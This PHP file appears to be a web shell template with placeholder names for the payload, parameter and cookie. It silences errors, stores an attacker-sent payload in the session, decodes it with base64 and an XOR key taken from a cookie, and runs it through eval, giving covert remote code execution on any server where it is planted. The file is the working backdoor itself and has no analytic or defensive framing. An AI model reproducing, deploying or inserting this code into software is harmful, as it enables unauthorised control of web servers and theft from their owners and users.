<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function AA_encode($D,$AA_key){
    for($AA_i=0;$AA_i<strlen($D);$AA_i++) {
        $AA_c = $AA_key[$AA_i+1&15];
        $D[$AA_i] = $D[$AA_i]^$AA_c;
    }
    return $D;
}
$AA_payloadName='$payloadName$';
$AA_pm='$param$';
if (isset($_SESSION[$AA_payloadName])){
    $AA_payload=AA_encode(base64_decode($_SESSION[$AA_payloadName]),$_SESSION['key']);
    eval($AA_payload);
    @run();
}else{
    $AA_data = $_POST[$AA_pm];
    $_SESSION[$AA_payloadName]=$AA_data;
    $_SESSION['key']=$_COOKIE['$cookie_name$'];
}

